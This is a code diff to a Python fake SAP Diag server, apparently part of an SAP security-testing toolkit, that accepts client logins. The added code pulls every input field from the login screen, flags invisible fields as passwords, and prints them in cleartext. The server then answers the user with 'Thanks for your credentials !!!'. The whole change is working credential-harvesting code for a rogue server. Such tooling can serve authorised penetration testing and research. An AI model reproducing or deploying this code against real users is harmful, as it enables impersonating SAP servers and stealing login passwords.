@@ -160,14 +160,14 @@ class SAPDiagServerHandler(SAPNIServerHandler):
         diag = self.packet[SAPDiag]
 
         # Handle exit transaction (OK CODE = /i)
-        if len(diag.get_item(0x10, 0x0c, 0x04)) > 0 and diag.get_item(0x10, 0x0c, 0x04)[0].item_value == "/i":
+        if len(diag.get_item("APPL", "VARINFO", "OKCODE")) > 0 and diag.get_item("APPL", "VARINFO", "OKCODE")[0].item_value == "/i":
             print "[*] Windows closed by the client %s" % str(self.client_address)
             self.logoff()
 
         # Handle events (UI EVENT SOURCE)
-        elif len(diag.get_item(0x10, 0x0f, 0x01)) > 0:
+        elif len(diag.get_item("APPL", "UI_EVENT", "UI_EVENT_SOURCE")) > 0:
             print "[*] UI Event sent by the client %s" % str(self.client_address)
-            ui_event_source = diag.get_item(0x10, 0x0f, 0x01)[0].item_value
+            ui_event_source = diag.get_item("APPL", "UI_EVENT", "UI_EVENT_SOURCE")[0].item_value
 
             # Handle function key
             if ui_event_source.valid_functionkey_data:
@@ -188,12 +188,22 @@ class SAPDiagServerHandler(SAPNIServerHandler):
                 print "[*] Other event sent by the client %s" % str(self.client_address)
 
         # Handle login request (DYNT Atom == \x00)
-        if len(diag.get_item(0x12, 0x09, 0x02)) > 0:
+        atoms = diag.get_item(["APPL", "APPL4"], "DYNT", "DYNT_ATOM")
+        if len(atoms) > 0:
             print "[*] Login request sent by the client %s" % str(self.client_address)
-            atoms = diag.get_item(0x12, 0x09, 0x02)[0].item_value
-            print "[*] Login fields:"
-            for item in atoms.items:
-                print "[+] %s" % item.text
+            # Print the Atom items information
+            print "[*] Input fields:"
+            for atom in [atom for atom_item in atoms for atom in atom_item.item_value.items]:
+                if atom.etype in [121, 122, 123, 130, 131, 132]:
+                    text = atom.field1_text or atom.field2_text
+                    text = text.strip()
+                    if atom.attr_DIAG_BSD_INVISIBLE and len(text) > 0:
+                        # If the invisible flag was set, we're probably
+                        # dealing with a password field
+                        print "[*]\tPassword field:\t%s" % (text)
+                    else:
+                        print "[*]\tRegular field:\t%s" % (text)
+
             print "[*] Sending error message to client %s" % str(self.client_address)
             self.request.send(str(SAPNI() / SAPDiag(compress=1, message=self.make_error_screen("Thanks for your credentials !!!"))))
 
